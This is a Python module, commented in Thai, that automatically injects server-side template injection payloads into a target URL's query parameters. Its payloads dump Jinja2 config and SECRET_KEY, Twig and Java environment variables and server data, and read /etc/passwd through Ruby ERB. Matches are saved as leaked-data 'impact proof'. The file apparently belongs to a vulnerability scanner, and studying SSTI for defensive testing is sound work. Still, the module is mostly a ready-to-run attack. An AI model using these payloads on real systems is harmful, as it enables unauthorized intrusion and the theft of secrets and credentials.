import aiohttp
import asyncio
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# Payloads ที่เน้นการ "คายข้อมูล" (Information Disclosure / RCE)
SSTI_PAYLOADS = [
    # [Jinja2 / Python]
    # พยายาม Dump config object ซึ่งมักเก็บ SECRET_KEY หรือ DB Password
    ("{{ config.items() }}", "SECRET_KEY", "Jinja2 Config Dump"),
    ("{{ config }}", "<Config", "Jinja2 Config Object"),
    
    # [Twig / PHP]
    # พยายาม Dump Environment Variables
    ("{{ _self.env }}", "Twig_Environment", "Twig Environment Dump"),
    ("{{ app.request.server.all|join(',') }}", "HTTP_USER_AGENT", "Twig Server Vars"),
    
    # [Java / Spring / Thymeleaf]
    ("${T(java.lang.System).getenv()}", "PATH=", "Java System Env Dump"),
    
    # [Ruby ERB]
    ("<%= File.open('/etc/passwd').read %>", "root:x", "Ruby LFI via SSTI"),
    
    # [Generic Math] - เอาไว้เป็น Fallback สุดท้ายถ้า Dump ไม่ได้
    ("{{1337*1337}}", "1787569", "Basic SSTI (Math Calculation)")
]

async def check_ssti(session, url):
    findings = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if not params: return findings

    for param_name in params:
        for payload, expected_keyword, vuln_name in SSTI_PAYLOADS:
            fuzzed_params = params.copy()
            fuzzed_params[param_name] = [payload]
            target_url = urlunparse(parsed._replace(query=urlencode(fuzzed_params, doseq=True)))
            
            try:
                async with session.get(target_url, timeout=5, ssl=False) as resp:
                    text = await resp.text()
                    
                    # ถ้าเจอ Keyword ที่เราคาดหวัง (เช่น SECRET_KEY หรือ root:x)
                    if expected_keyword in text:
                        # หาหลักฐานมาโชว์ (ตัดมาเฉพาะส่วนที่เจอ Keyword)
                        start_idx = text.find(expected_keyword)
                        start_show = max(0, start_idx - 50)
                        end_show = min(len(text), start_idx + 300)
                        evidence_snippet = text[start_show:end_show]

                        findings.append({
                            "type": f"SSTI ({vuln_name})",
                            "severity": "Critical",
                            "detail": f"Template Injection confirmed on '{param_name}'. Successfully extracted server context.",
                            "evidence": f"Payload: {payload}\n\n[IMPACT PROOF - DUMPED DATA]\n...{evidence_snippet}...\n[END SNIPPET]",
                            "remediation": "Sanitize input or use a sandboxed template environment."
                        })
                        return findings # เจอแล้วหยุดเลย ตัวเดียวรู้เรื่อง
            except: pass
            
    return findings

async def run_ssti_scan(target_url, log_callback=None, headers=None):
    findings = []
    if "?" in target_url:
        if log_callback: log_callback(f"🔥 Attempting SSTI to Dump Server Configuration...")
        async with aiohttp.ClientSession(headers=headers) as session:
            findings = await check_ssti(session, target_url)
            
    return findings